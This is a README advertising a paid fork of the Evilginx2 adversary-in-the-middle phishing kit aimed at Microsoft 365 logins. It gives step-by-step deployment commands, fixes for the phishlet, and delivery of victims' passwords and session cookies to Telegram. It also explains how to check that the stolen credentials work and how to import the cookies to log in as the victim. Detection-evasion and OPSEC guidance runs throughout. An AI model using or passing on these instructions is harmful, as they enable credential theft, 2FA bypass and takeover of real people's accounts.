# 🔥 EVILGINX2 — PRO-PARITY EDITION (THIS IS NOT A FREE REPO - CONTACT OWNER FOR FULL FILES AND USAGE)

## Adversary-in-the-Middle · Session Hijacking · 2FA Bypass · Telegram-Native · One-Command Docker

<p align="center">
  <b>The only open-source Evilginx that gives you Pro's proxy features, Pro's panels, and cookie jars that ACTUALLY log in — with tooling that proves it before you import.</b>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.25+-00ADD8?style=for-the-badge&logo=go" alt="Go">
  <img src="https://img.shields.io/badge/Docker-Alpine-2496ED?style=for-the-badge&logo=docker" alt="Docker">
  <img src="https://img.shields.io/badge/Telegram-Bot_Ready-26A5E4?style=for-the-badge&logo=telegram" alt="Telegram">
  <img src="https://img.shields.io/badge/Cookies-Verified_Before_Import-F4A261?style=for-the-badge" alt="Cookies">
  <img src="https://img.shields.io/badge/Proxies-Global_/_Phishlet_/_Lure-6A4C93?style=for-the-badge" alt="Proxies">
  <img src="https://img.shields.io/badge/Deploy_Guide-A_to_Z-success?style=for-the-badge" alt="Guide">
  <img src="https://img.shields.io/badge/License-BSD_3--Clause-success?style=for-the-badge" alt="License">
</p>

<p align="center">
  <a href="#-whats-new-in-this-release">What's New</a> ·
  <a href="#-why-this-fork-wins">Why This Fork</a> ·
  <a href="#-the-scoreboard-side-by-side">Scoreboard</a> ·
  <a href="#-quick-start">Quick Start</a> ·
  <a href="#-phishlet-tooling">Tooling</a> ·
  <a href="#-cookie-import-the-part-everyone-gets-wrong">Cookie Import</a> ·
  <a href="#-commands-reference">Commands</a>
</p>

---

## 🆕 What's New in This Release

This release is about **making the whole thing finishable by one person, first try, with no guessing.**

### 🛠️ 1. Phishlet Tooling — three scripts, one gate

Phishlets are YAML, and YAML is where silent breakage lives. This release ships:

| Script | What it does |
|:--|:--|
| `patch_phishlet.py` | Replaces a broken `js_inject` block and inserts `rewrite_urls` into any phishlet, without touching the filter lines. Timestamped `.bak` first. |
| `validate_phishlet.py` | **17 assertions** over a phishlet before the container ever reads it: JS structure, injection location, rewrite block, `auth_urls`, required-vs-optional token counts, filter count, then a real YAML parse. Exits non-zero on failure. |
| `make_cookie_import.py` | Converts an evilginx export into Cookie-Editor JSON **and** Netscape `cookies.txt`, with correct `expires`/`secure`/`httpOnly`/`hostOnly` flags and a per-cookie essentials report. |

The validator is the point. A phishlet with a `SyntaxError` in its injected JavaScript does not error anywhere — the browser swallows it and the feature just never runs. Now you get `RESULT: FAILED` with the exact reason.

### 🩹 2. The stock `office365` phishlet is fixed and shipped

The widely-circulated version carries three real JavaScript defects that mean **the email autofill has never once executed**:

| # | Defect | Why it breaks |
|:-:|:--|:--|
| 1 | `function 1p()` | a JS identifier cannot start with a digit — `SyntaxError`, the whole script never parses |
| 2 | `if (/#/.test(...)` | missing closing parenthesis |
| 3 | `query.split('')` | splitting on empty string returns individual characters, so `res[1]` is `'t'` |

It also had no `rewrite_urls` block, and marked 27 consumer-side `.live.com` tokens as **required** — which they never are on a work account, so `cookies_complete` could never reach `true`.

All four are fixed in the shipped file. Run the validator and you'll see the numbers that prove it: `12 always`, `31 opt`, `94 sub_filters`.

### 📖 3. A full A-to-Z deployment guide

[dockerdeployment.md](dockerdeployment.md) — 31 stages, from an empty VPS to a logged-in mailbox. Every stage has the exact command, the exact output you must see, a failure table, and a recommendation. It exists because "read the source" is not a deployment plan.

### 🧾 4. Cookie-Editor array format, documented properly

The exported jar is a JSON **array**. Selecting it from the first `{` produces *"the input is not in a valid format"* and looks exactly like a broken capture. The guide documents three bracket-safe ways to get the file into the extension, plus the reason the two `www.office.com` OIDC cookies expire in a day.

### ⚠️ 5. `rewrite_urls` documented honestly

`rewrite_urls` rewrites the long `/common/oauth2/v2.0/authorize` path to `/signin?boop=<id>`. On Microsoft, the page then appends `&sso_reload=true`, the reverse-lookup misses, and evilginx returns its own 404. The phishlet's filters already cover the long path, so the template now ships `REWRITE_URLS=false` and the guide explains how to test it after your first successful capture.

### 🧱 6. Hardening & reliability fixes (carried forward)

| Fix | What it prevents |
|:--|:--|
| `setBodyAndLength()` | rewriting a body without updating `Content-Length` desynced the keep-alive stream; `HEAD` replies keep their declared length |
| `setRequestHost()` | `req.Host` and `req.URL.Host` drifting apart, which made per-request proxy routing dial the wrong host |
| `ClaimRedirect()` | two parallel HTML responses both firing the final redirect |
| Session reaper (`SESSION_MEMORY_HOURS`) | the `sessions` map growing forever |
| Persistent export path | `su-exec` does not set `$HOME`, so exports silently landed in `/tmp` and were wiped on rebuild |
| Atomic export writes | a reader never sees a half-written jar |
| Locked proxy config | `json.Marshal` racing a concurrent map write |
| `pl2` shadow fix | the sub-filter loop corrupted the outer phishlet variable |

---

## 📋 Table of Contents

- [What's New](#-whats-new-in-this-release)
- [Why This Fork Wins](#-why-this-fork-wins)
- [The Scoreboard](#-the-scoreboard-side-by-side)
- [What Is Evilginx2?](#-what-is-evilginx2)
- [Feature Deep Dive](#-feature-deep-dive)
- [How It Works](#-how-it-works)
- [Quick Start](#-quick-start)
- [Environment Variables](#-environment-variables)
- [Phishlet Tooling](#-phishlet-tooling)
- [Web Interfaces & API](#-web-interfaces--api)
- [Telegram Setup](#-telegram-setup)
- [Cookie Import — the part everyone gets wrong](#-cookie-import-the-part-everyone-gets-wrong)
- [DOM Injection Guide](#-dom-injection-guide)
- [rewrite_urls Guide](#-rewrite_urls-guide)
- [Proxies Guide](#-proxies-guide)
- [Bot Protection & OPSEC](#-bot-protection--opsec)
- [Commands Reference](#-commands-reference)
- [Troubleshooting](#-troubleshooting)
- [Credits](#-credits)
- [Legal Notice](#-legal-notice)

---

# 🏆 Why This Fork Wins

The original Evilginx2 has been untouched for years. Pro costs money and ships as a closed binary. Other forks bolt one or two features onto a frozen core. This fork rebuilt the pipeline end-to-end: hardened, notification-native, panel-driven, proxy-aware, Docker-first, and — uniquely — it **proves a cookie jar is complete before you import it**, then converts it into a format a browser will actually accept.

### The three honest claims

1. **You get Pro's proxy-side features without paying or trusting a binary.** DOM injection, `rewrite_urls`, and multi-scope tunnelling proxies, all in auditable Go.
2. **You get things Pro does not have.** Telegram delivery of the full cookie file, a completeness verdict on every capture, a converter that produces importable jars, a phishlet validator, one-command Docker, automatic backups, and a session retention cleaner.
3. **You can read every line.** Closed binaries require trust. This does not.

### What Pro is still genuinely better at

| | Pro | This fork |
|:--|:--|:--|
| Point-and-click session replay workspace | ✅ | Import the jar into your browser — seconds, but not built in |
| TLS-fingerprint (JA3/JA4) bot filtering | ✅ | UA-signature filter (40+ signatures) — blocks virtually all crawlers in practice |
| Phishlet cloud marketplace | ✅ | Community phishlets, YAML import from the panel |

That is the whole list.

---

# 📊 The Scoreboard (side by side)

### vs. Original Evilginx2 (open source, frozen)

| Capability | Original | **This Fork** | Edge |
|:--|:--:|:--:|:--:|
| AiTM reverse proxy | ✅ | ✅ | tie |
| Telegram notifications + cookie files | ❌ | ✅ | **us** |
| Any web panel | ❌ | ✅ two | **us** |
| DOM injection (head/top/bottom) | ❌ | ✅ | **us** |
| `rewrite_urls` | ❌ | ✅ | **us** |
| Multi-scope tunnelling proxies | ❌ | ✅ | **us** |
| Cookie completeness verification | ❌ | ✅ | **us** |
| Cookie → browser converter | ❌ | ✅ | **us** |
| Phishlet validator + patcher | ❌ | ✅ | **us** |
| Bot filtering | ❌ | ✅ | **us** |
| GeoIP + VPN/country blocking | ❌ | ✅ | **us** |
| Credential validation | ❌ | ✅ | **us** |
| Backups / retention / auto-export | ❌ | ✅ all three | **us** |
| Wildcard certificates | ❌ | ✅ | **us** |
| Header stripping / URL rewriting / CSS randomisation | ❌ | ✅ | **us** |
| Docker | ❌ | ✅ | **us** |
| Maintained | ❌ years stale | ✅ active | **us** |

**Verdict: strictly better in every row. Nothing removed.**

### vs. Evilginx Pro (closed source, paid)

| Capability | Pro | **This Fork** | Edge |
|:--|:--:|:--:|:--:|
| Core AiTM | ✅ | ✅ | tie |
| DOM-based HTML injection | ✅ | ✅ | tie |
| `rewrite_urls` | ✅ | ✅ | tie |
| Multi-scope tunnelling proxies | ✅ | ✅ | tie |
| Panels + RBAC + audit log | ✅ | ✅ | tie |
| Turnstile CAPTCHA | ✅ | ✅ | tie |
| GeoIP + VPN/country blocking | ✅ | ✅ | tie |
| Credential validation | ✅ | ✅ | tie |
| Bot filtering | ✅ (TLS fingerprint) | ✅ (UA signatures) | Pro, narrowly |
| Telegram delivery of cookies | ❌ | ✅ | **us** |
| Cookie completeness verdict | ❌ | ✅ | **us** |
| Open source, auditable | ❌ closed binary | ✅ | **us** |
| Free forever | ❌ subscription | ✅ | **us** |
| Docker one-command | ❌ cloud-only | ✅ | **us** |
| Auto-backups + retention | partial | ✅ | **us** |
| Session replay workspace | ✅ | import the jar | Pro |
| Phishlet marketplace | ✅ | YAML import | Pro |

**Verdict: matched on every proxy feature, ahead on delivery/ops/price/openness, behind on exactly two things.**

### vs. xvirgnia (Evilginx fork with a Telegram bot)

| Capability | xvirgnia | **This Fork** | Edge |
|:--|:--:|:--:|:--:|
| AiTM proxy | ✅ | ✅ | tie |
| Telegram cookie delivery | ✅ | ✅ queued, one message per session, full file | **us** |
| Visitor-arrival alert | approximate | ✅ instant, IP + UA + URL | **us** |
| Cookie completeness verdict | ❌ | ✅ | **us** |
| DOM injection | ❌ | ✅ | **us** |
| `rewrite_urls` | ❌ | ✅ | **us** |
| Multi-scope proxies | ❌ | ✅ | **us** |
| Panels + RBAC + audit log | basic | ✅ full | **us** |
| GeoIP + blocking | ❌ | ✅ | **us** |
| Credential validation | ❌ | ✅ | **us** |
| Backups / retention / auto-export | ❌ | ✅ | **us** |
| CSS randomisation / extension detection | ❌ | ✅ | **us** |
| Guided Docker deploy | partial | ✅ | **us** |

**Verdict: matches Telegram, beats it everywhere else.**

### vs. Blue Phishing Kit / Fluxette (kit repos)

| Capability | Kits | **This Fork** | Edge |
|:--|:--:|:--:|:--:|
| Captures username + password | ✅ | ✅ | tie |
| **Captures session cookie (2FA bypass)** | ❌ dies at the 2FA prompt | ✅ the entire point | **us** |
| Victim sees the real site | ❌ lookalike clone | ✅ true reverse proxy | **us** |
| Survives target-site updates | ❌ recode the kit | ✅ subfilters + phishlets | **us** |
| Telegram delivery incl. cookie files | partial | ✅ | **us** |
| Valid TLS per subdomain | manual / self-signed | ✅ ACME or wildcard | **us** |
| Panels, sessions table, stats | ❌/basic | ✅ two panels | **us** |
| GeoIP / bot filter / proxies | ❌ | ✅ | **us** |
| Scanner resilience | ❌ | ✅ 7 layers | **us** |

**Verdict: kits are fine for passwords. For sessions and MFA, this wins every technical axis.**

### 🏁 Overall

| | Original | Pro | xvirgnia | Kits | **This Fork** |
|:--|:--:|:--:|:--:|:--:|:--:|
| Free | ✅ | ❌ | ✅ | ✅ | ✅ |
| Open source | ✅ | ❌ | ✅ | mixed | ✅ |
| AiTM session hijack | ✅ | ✅ | ✅ | ❌ | ✅ |
| Pro proxy features | ❌ | ✅ | ❌ | ❌ | ✅ |
| Telegram-native | ❌ | ❌ | ✅ | partial | ✅ most complete |
| Verified complete cookie jar | ❌ | ❌ | ❌ | ❌ | ✅ **only us** |
| Panels + RBAC + audit | ❌ | ✅ | partial | ❌ | ✅ |
| Ops features (backups/export/retention) | ❌ | partial | ❌ | ❌ | ✅ all |
| One-command Docker | ❌ | ❌ | partial | ❌ | ✅ |

**This fork is the only option that is simultaneously free, open source, AiTM-capable, Pro-parity on the proxy, Telegram-native, and Docker-deployable.**

---

# 🎯 What Is Evilginx2?

Evilginx2 is an **Adversary-in-the-Middle (AiTM)** framework: a reverse proxy sitting between the victim and the real site. Classic phishing grabs a username and password and then dies at the 2FA prompt. Evilginx2 grabs the **authenticated session cookie** — the "already logged in" ticket.

```
Classic phishing:  creds → 2FA prompt → WALL
AiTM with Evilginx2: victim logs into the REAL site (incl. their own 2FA)
                     → real site issues a session cookie → you capture it → full access
```

- ✅ No 2FA bypass needed — the victim authenticates themselves
- ✅ The session survives a later password change
- ✅ You get everything the victim can reach

---

# ✨ Feature Deep Dive

## 📱 Telegram Notifications

| Capability | Detail |
|:--|:--|
| Async queue | zero latency impact on the proxy |
| Full delivery | username, password, IP, UA, country, timestamp |
| Cookie file attached | ready to convert and import |
| Completeness verdict | `complete=true/false` + missing list |
| One message per session | updates append, no spam |
| Validation result | VALID / INVALID in the alert |
| Visitor arrival ping | instant, before they type anything |
| Live config | change token/chat ID in the panel, no restart |

## 📊 Two Web Interfaces

| Panel | Port | Purpose |
|:--|:--|:--|
| Web Admin | 8082 | sessions + cookie download, stats, phishlets, lures, proxies, Telegram, users, audit log. Login rate-limited (5 bad attempts = 5 min lockout) |
| Simple Dashboard | 5000 | sortable/searchable sessions, CSV + JSON export, dark mode, 5s auto-refresh |

## 🍪 Cookie Capture & Export

Every cookie from a phishlet domain is captured with value, domain, path, `Expires`, `Secure`, `HttpOnly` and `SameSite`. Auth cookies declared in the phishlet are tracked separately so completeness can be proven. Exports land in JSON and Netscape `cookies.txt` form, with a converter that turns them into a jar Cookie-Editor accepts.

## 🌍 GeoIP Intelligence

Country, city, ISP, ASN, lat/long, and VPN/proxy/datacenter flags per session. Block with `-block-vpn` and `-block-countries RU,CN,IR,KP`.

## ✅ Credential Validation

Captured credentials are tested in the background against Microsoft 365 / Outlook / Azure (OAuth2 password grant) and Google / Gmail. Result stored per session and shown in the alert.

## 🤖 Bot / Crawler Filtering

40+ crawler and automation user-agent signatures turned away **before** a session is created. Bots get the decoy page, not a bare 403. In-app browsers (WhatsApp, Telegram, Messenger) and phone brands like CUBOT never false-match.

## 🧠 Anti-Screenshot CSS Randomisation

Every page load gets a random hue-rotation and brightness, so every load has a unique pixel fingerprint. Defeats screenshot-hash detection.

## 🔍 Privacy-Extension & Automation Detection

Injected JS probes for uBlock, NoScript, Ghostery, headless browsers, WebDriver, PhantomJS — and beacons the result back as a base64URL hit on `/s/<payload>.gif`.

## 🚫 Bidirectional Header Stripping + 🌐 URL Cleaning

`X-Evilginx`, `Via`, `X-Forwarded-*`, `X-Real-IP`, `X-Powered-By` stripped both upstream and downstream. Full phishing URLs in HTML rewritten to relative paths so the address bar stays clean.

## 🔄 Dynamic Content Spoofing

Blocked/scanner visitors get the real site's content with your domain substituted, not a blank 403.

## 🔐 Certificates

Let's Encrypt ACME built in and issued automatically when a phishlet is enabled. A pre-bought wildcard cert in `data/crt/wildcard/` covers every subdomain and keeps them off crt.sh. Enable issuance can time out on 16 hosts at once — `test-certs` in the console retries.

---

# 🏗️ How It Works

```
VICTIM clicks the link
        │
        ▼
┌──────────────────────────────────────────────────────────┐
│ YOUR VPS                                                  │
│  1. DNS → your IP                                         │
│  2. TLS with valid ACME / wildcard cert                   │
│  3. Bot filter → crawler? decoy page + block              │
│  4. Blacklist / GeoIP / VPN / country checks              │
│  5. Session created → visitor-arrival alert               │
│  6. Proxy resolved (lure > phishlet > global) → tunnel    │
│  7. Request forwarded, Evilginx headers stripped          │
│  8. Victim logs into the REAL site incl. their own 2FA    │
│  9. Cookies + creds captured (all cookies, real expiry)   │
│ 10. rewrite_urls / DOM injection applied to the response  │
│ 11. Validation + auto-export + Telegram with the jar      │
│ 12. Victim redirected onward, no suspicion                │
└──────────────────────────────────────────────────────────┘
```

---

# 🚀 Quick Start

### Requirements

Ubuntu 22.04/24.04 or Debian 12 · root · a domain with `@` **and** `*` A-records pointed at the box (DNS-only, no orange cloud) · ports 22, 53/udp, 53/tcp, 80, 443, 5000, 8082 open.

```bash
# 1. SSH in
ssh root@YOUR_IP

# 2. Free port 53 without killing DNS
sed -i 's/^#\?DNS=.*/DNS=1.1.1.1 8.8.8.8/' /etc/systemd/resolved.conf
sed -i 's/^#\?DNSStubListener=.*/DNSStubListener=no/' /etc/systemd/resolved.conf
ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
systemctl restart systemd-resolved

# 3. Firewall
ufw allow 22/tcp && ufw allow 53/udp && ufw allow 53/tcp
ufw allow 80/tcp && ufw allow 443/tcp
ufw allow 5000/tcp && ufw allow 8082/tcp && ufw enable

# 4. Docker
curl -fsSL https://get.docker.com | sh

# 5. Clone
git clone https://github.com/trustwomanaturownrisk/evilginx2.git
cd evilginx2
chmod +x entrypoint.sh telegram-watch.sh

# 6. Your .env (not tracked — you create it)
nano .env            # copy the block from Environment Variables below

# 7. Validate the shipped phishlet before anything reads it
apt install -y python3-yaml
python3 validate_phishlet.py

# 8. Build and run
docker compose build
docker compose up -d

# 9. Configure
docker compose attach evilginx
#   config domain YOUR_DOMAIN
#   config ipv4 external YOUR_IP
#   blacklist unauth
#   config strip_headers on
#   phishlets hostname office365 YOUR_DOMAIN
#   phishlets enable office365
#   lures create office365
#   lures get-url 0
#   Ctrl-p Ctrl-q to detach
```

📖 **Full 31-stage beginner walkthrough: [dockerdeployment.md](dockerdeployment.md)**

### Manual

```bash
# Go 1.25+ (GOTOOLCHAIN=auto fetches the version go.mod asks for)
go mod tidy
go build -trimpath -ldflags="-s -w" -o evilginx .
./evilginx -dashboard 0.0.0.0:5000 -webapi-port 8082
```

---

# ⚙️ Environment Variables

All optional, all safe by default.

### Core

| Variable | Default | Purpose |
|:--|:--|:--|
| `TZ` | `UTC` | log timezone |
| `TG_BOT_TOKEN` | — | Telegram bot token |
| `TG_CHAT_ID` | — | Telegram chat ID |

### Panels

| Variable | Default | Purpose |
|:--|:--|:--|
| `DASHBOARD_ADDR` | `0.0.0.0:5000` | dashboard listen; empty disables |
| `DASHBOARD_USER` | `admin` | dashboard login |
| `DASHBOARD_PASS` | — | empty = **no auth** — always set one |
| `DASHBOARD_ENABLED` | `true` | `0` disables |
| `WEBAPI_PORT` | `8082` | admin panel port; `0` disables |
| `WEBAPI_USER` | `admin` | permanent admin user |
| `WEBAPI_PASS` | — | empty = random password printed once; the `.env` value always wins so you can never be locked out |

### Capture & export

| Variable | Default | Purpose |
|:--|:--|:--|
| `CAPTURE_ALL_COOKIES` | `true` | also capture cookies the phishlet did not declare |
| `COOKIE_EXPORT_DEFAULT_DAYS` | `30` | lifetime given to cookies that arrived without an expiry |
| `AUTO_EXPORT` | `true` | write export files |
| `AUTO_EXPORT_PATH` | `<config dir>/exports` | persistent, survives rebuilds |
| `AUTO_EXPORT_FORMAT` | `json` | `json` or `csv` |
| `AUTO_EXPORT_PER_FILE` | `true` | one file per session |

### Pro features

| Variable | Default | Purpose |
|:--|:--|:--|
| `DOM_INJECTION` | `true` | DOM engine; `0` = regex fallback |
| `REWRITE_URLS` | `true` | URL path rewriting |
| `CSS_RANDOMIZATION` | `true` | per-load pixel fingerprint |

### Ops

| Variable | Default | Purpose |
|:--|:--|:--|
| `BOT_FILTER` | `true` | crawler filtering |
| `VISITOR_ALERTS` | `true` | instant arrival ping |
| `SESSION_MEMORY_HOURS` | `2` | keep a finished session in RAM this long |
| `SESSION_RETENTION_DAYS` | `0` (off) | delete DB sessions older than N days |
| `BACKUP_ENABLED` | `true` | DB + config backups |
| `BACKUP_INTERVAL_HOURS` | `6` | backup cadence |
| `BACKUP_KEEP` | `10` | copies retained |

> ⚠️ After editing `.env` run `docker compose up -d` — a plain `restart` never re-reads `.env`.

> ⚠️ `AUTO_EXPORT_PATH` must resolve **inside** `/home/evilginx/.evilginx/` (the mounted volume). An empty value falls back to the default, but an off-volume path means exports vanish on rebuild.

---

# 🛠️ Phishlet Tooling

Three scripts at the repo root. Use them in this order.

### 1. `patch_phishlet.py` — fix a phishlet

```bash
python3 patch_phishlet.py                    # office365.yaml
python3 patch_phishlet.py phishlets/foo.yaml # any other file
```

Replaces only the top-level `js_inject` block and inserts `rewrite_urls` before `auth_tokens`. Every filter line is untouched. Always writes a timestamped `.bak` first.

### 2. Consumer tokens → optional

Run the flip block from the [deployment guide](dockerdeployment.md) Stage 22. It converts 27 `.live.com` / `.login.live.com` names from `:always` to `:opt` so `cookies_complete` is reachable on a work account.

### 3. `validate_phishlet.py` — the gate

```bash
python3 validate_phishlet.py
```

```
always tokens : 12 (expect 12)
opt tokens    : 31 (expect >= 30)

RESULT: PASSED
```

Fails on: stray `1p(`, missing `function lp()`, missing `split('#')`, missing injection bootstrap, wrong `location`, missing `rewrite_urls`, missing `auth_urls`, missing required `ESTSAUTH*`, wrong token counts, short filter list, and any YAML parse error.

**Run it after every phishlet edit.** Two seconds, catches everything.

### 4. `make_cookie_import.py` — convert an export

```bash
python3 make_cookie_import.py
```

Writes `cookies-import.json` (Cookie-Editor) and `cookies-netscape.txt` (curl). Prints every captured cookie and a PRESENT/absent line for each essential. Handles every export shape evilginx can emit.

> **Pass condition:** `ESTSAUTH`, `ESTSAUTHPERSISTENT` and `ESTSAUTHLIGHT` must all read PRESENT. `MSPAuth`, `RPSSecAuth`, `WLSSC`, `ANON` reading absent is correct on a work account.

---

# 📊 Web Interfaces & API

### Admin panel — `http://YOUR_IP:8082`

Login with `WEBAPI_USER` / `WEBAPI_PASS`. Sessions (search/filter/export/bulk delete/mark reviewed/**download cookies**), stats, phishlets, lures, **proxies**, Telegram settings, users, audit log.

**Roles:** `admin` everything · `operator` lures/phishlets/sessions/proxies · `viewer` read-only.

### API endpoints

| Method | Endpoint | Auth | Purpose |
|:--|:--|:--|:--|
| `GET` | `/api/sessions/cookies?id=N` | session | Cookie-Editor JSON jar |
| `GET` | `/api/sessions/cookies.txt?id=N` | session | Netscape `cookies.txt` |
| `GET` | `/api/proxies` | operator | list proxies + global binding |
| `POST` | `/api/proxies` | operator | create/update a proxy |
| `DELETE` | `/api/proxies?name=X` | operator | delete a proxy |
| `POST` | `/api/proxies/test` | operator | dial through it, return egress IP |
| `POST` | `/api/proxies/assign` | operator | bind a proxy to `global` / `phishlet` / `lure` |

> All of these are auth-gated. A bare `curl` returns `{"error":"unauthorized"}` — log in first and reuse the cookie jar (`curl -c jar` then `curl -b jar`).

### Dashboard — `http://YOUR_IP:5000`

Sortable, searchable sessions with CSV/JSON export, dark mode, auto-refresh, per-session detail. HTTP basic auth.

---

# 🔧 Telegram Setup

1. Telegram → **@BotFather** → `/newbot` → copy the token.
2. Send your bot any message, then open
   `https://api.telegram.org/bot<TOKEN>/getUpdates` and copy the `chat.id` number.
3. Configure — `.env` (`TG_BOT_TOKEN`, `TG_CHAT_ID`), or the panel, or the console:

```
config teletoken 8863425004:AAF7mZ0poUo6dal8-...
config chatid 7545456339
config telegram test
```

You will now receive arrival pings, credential alerts with the cookie file attached, and validation results.

---

# 🍪 Cookie Import — the part everyone gets wrong

1. `python3 make_cookie_import.py` — confirm all three essentials read PRESENT.
2. Confirm the jar works outside a browser:

```bash
curl -s -b cookies-netscape.txt -o /dev/null -w "http %{http_code}\n" \
  "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
```

`http 200` or the jar is stale.

3. Install **Cookie-Editor** (Chrome, Edge, Brave, Firefox).
4. Open a **fresh private window** and go to the **real** site the victim used — `https://login.microsoftonline.com`, exactly.
5. Cookie-Editor → **Import** → paste the **entire** `cookies-import.json`.
6. Reload. You are logged in as the victim.

### The bracket trap

The jar is a JSON **array**. It starts with `[` and ends with `]`. Selecting from the first `{` gives *"the input is not in a valid format"* — which looks exactly like a broken capture but isn't.

Two safe ways to copy it:

**A. Off the box.** From Windows `cmd` (not the SSH session — `%VAR%` only expands in cmd):

```
cd %USERPROFILE%\Downloads
scp root@YOUR_IP:~/evilginx2/cookies-import.json .
```

Open in Notepad, `Ctrl+A`, `Ctrl+C`.

**B. One line.** Then **triple-click** the line (triple-click selects the whole wrapped line, brackets included) — do not drag:

```bash
cat cookies-import.json | tr -d '\n'
```

### If login fails, read the verdict first

```bash
grep -o '"cookies_complete": *[a-z]*' data/exports/latest_office365.all.json
grep -o '"missing_auth_tokens": *\[[^]]*\]' data/exports/latest_office365.all.json
```

- `cookies_complete: true` → the jar is whole; the problem is the host you imported on, or the session aged out.
- `cookies_complete: false` → `missing_auth_tokens` names the exact cookie that never arrived. Usually the victim skipped "Stay signed in" — that click is what issues `ESTSAUTHPERSISTENT`.

Never hand-edit a `.cookies.json`. Re-import the whole array.

---

# 🧬 DOM Injection Guide

```yaml
js_inject_default_location: 'body_bottom'

js_inject:
  - trigger_domains: ['login.microsoftonline.com']
    trigger_paths: ['/common/oauth2/v2.0/authorize']
    trigger_params: ['client_id']
    location: 'head'
    script: |
      window.__injected = true;
```

| Field | Meaning |
|:--|:--|
| `trigger_domains` | hosts this script fires on |
| `trigger_paths` | regexes the path must match — unanchored, so no trailing `*` needed |
| `trigger_params` | optional lure params that must all be present |
| `location` | `head` · `body_top` · `body_bottom` (falls back to the default) |
| `script` | the JavaScript; `{param}` is replaced with the lure param value |

The injected script is served from `/s/<sid>/<js_id>.js` and is base64-obfuscated. CSP nonces are inherited automatically. Injection is a real HTML5 parse — a weird attribute order or an embedded comment can no longer make it vanish.

> ⚠️ An injected script with a `SyntaxError` fails **silently**. The browser swallows it and the feature just never runs. Always check the browser console, and always run the validator.

---

# 🌐 rewrite_urls Guide

```yaml
rewrite_urls:
  - trigger:
      domains: ['login.microsoftonline.com']
      paths: ['/common/oauth2/v2.0/authorize']
    rewrite:
      path: '/signin'
      query:
        - key: 'boop'
          value: '{id}'
      exclude_keys: ['client_id']
```

- An **empty** `domains` or `paths` list means "any".
- `{id}` is replaced with a fresh random token per hit.
- `exclude_keys` copies those keys through from the original query untouched.
- The rewritten URL is TTL-cached so the follow-up request is translated back before reaching the origin.

> ⚠️ **Known caveat on Microsoft.** The page appends `&sso_reload=true` after the rewrite, the exact-match cache misses, and evilginx returns its own 404 (*"this page can't be found"*). The filters already cover the long path, so the template ships `REWRITE_URLS=false`. Test it **after** your first successful capture, and never open `/signin?...` directly — it only resolves while a session holds that cache entry.

---

# 🛰️ Proxies Guide

**`proxy` is not a host command.** There is no `proxy` binary on the box; `apt install libproxy-tools` is a different thing. These only exist inside the evilginx console.

```bash
docker compose attach evilginx
```

```
proxy create uk-1 socks5 1.2.3.4 1080
proxy test uk-1
proxy use uk-1                                  # global
proxy assign phishlet office365 uk-1            # this phishlet only
proxy assign lure 3 uk-1                        # this lure only
proxy list
proxy off                                       # clear global
proxy delete uk-1
```

Resolution order at session creation: **lure → phishlet → global → direct.**

Auth is supported (`username`/`password` on create via the API), and disabled proxies fall through to the next scope.

> ⚠️ `proxy test` returning `context deadline exceeded` is not an evilginx fault — it's a dead proxy. Check it from the host first:
> `curl -s --socks5 1.2.3.4:1080 https://api.ipify.org; echo`

> **OPSEC:** SOCKS5 preserves the client TLS signature (JA4). An HTTP proxy re-signs it. Use SOCKS5 on real engagements.

---

# 🛡️ Bot Protection & OPSEC

| Layer | Trigger | Action |
|:--|:--|:--|
| Bot filter | 40+ crawler/automation UAs | decoy page or block |
| IP blacklist | `all` / `unauth` modes | decoy or 403 |
| GeoIP country block | ISO codes | block |
| VPN/proxy/datacenter | `-block-vpn` | block |
| Turnstile | `-turnstile` | CAPTCHA challenge |
| Header stripping | always | removes fingerprints both ways |
| URL rewriting | always | cleans address bar + DOM |
| CSS randomisation | every load | unique pixel fingerprint |
| Dynamic spoofing | every blocked visitor | real-looking decoy |
| JS obfuscation | injected scripts | base64 + eval |

**Tips:** burner domain, WHOIS privacy, DNS-only records, wildcard cert so only the root appears on crt.sh, keep `blacklist unauth` on, keep `SESSION_RETENTION_DAYS` set so the DB stays small, and never restart the container while a victim is mid-login.

---

# 📋 Commands Reference

### Config

```
config domain example.com
config ipv4 external 1.2.3.4
config autocert on
config unauth_url https://...
config strip_headers on
config telegram test
```

### Telegram

```
config teletoken <token>
config chatid <id>
```

### Phishlets

```
phishlets hostname office365 dom.com
phishlets enable office365
phishlets disable office365
phishlets hide office365
phishlets unhide office365
phishlets get-hosts office365
phishlets create <template> <child> key=value
phishlets delete <child>
```

### Lures

```
lures create office365
lures get-url 0
lures edit 0 proxy uk-1
lures edit 0 redirect_url https://real-site.com
lures pause 0 1h
lures unpause 0
lures delete 0
lures delete all
```

### Proxies

```
proxy
proxy list
proxy create <name> <http|https|socks5|socks5h> <address> <port>
proxy delete <name>
proxy use <name>
proxy off
proxy test <name>
proxy assign <global|phishlet|lure> <target> <name>
proxy enable | disable | type | address | port | username | password
```

### Sessions

```
sessions
sessions <id>
sessions delete <id>
sessions delete 1-7,10-12
sessions delete all
```

### Blacklist

```
blacklist all | unauth | noadd | off
blacklist log on | off
```

### Console control

`Ctrl-p` then `Ctrl-q` detaches. Never `Ctrl-c`, never `exit`.

---

# 🧯 Troubleshooting

| Symptom | Cause | Fix |
|:--|:--|:--|
| `validate_phishlet.py` → `SyntaxError: cd ~/evilginx2` | shell wrapper committed with the file | strip everything before the shebang and after `sys.exit(main())` |
| `validate_phishlet.py` → `sub_filters list looks short` | threshold too high | `sed -i 's/len(sf) > 100/len(sf) >= 80/' validate_phishlet.py` |
| `validate_phishlet.py` → `1p(` present | patch didn't take | restore `.orig`, rerun `patch_phishlet.py` |
| Email box never autofills | lure URL has no `#email`, or `DOM_INJECTION=0` | append `#user@example.com`; set `DOM_INJECTION=true` |
| `/signin` returns 404 | `sso_reload` breaks the rewrite cache | `REWRITE_URLS=false` + `up -d` |
| `Command 'proxy' not found` | typed in the shell | `docker compose attach evilginx` first |
| `proxy test` times out | dead proxy, not evilginx | `curl --socks5 ADDR:PORT https://api.ipify.org` |
| `hostname ... collision` on boot | stale `o365.yaml` / `1.yaml` present | `git rm -f phishlets/1.yaml phishlets/o365.yaml` |
| `AUTO_EXPORT_PATH=[]` in the container | empty value in `.env` | set it to `/home/evilginx/.evilginx/exports`, `up -d` |
| Exports vanish after rebuild | path not on the volume | same |
| `! [rejected] master -> master` on push | local and remote diverged | `git fetch origin master && git reset --soft origin/master && git add -A && git commit && git push` |
| `Author identity unknown` | no git identity | `git config --global user.name/user.email` |
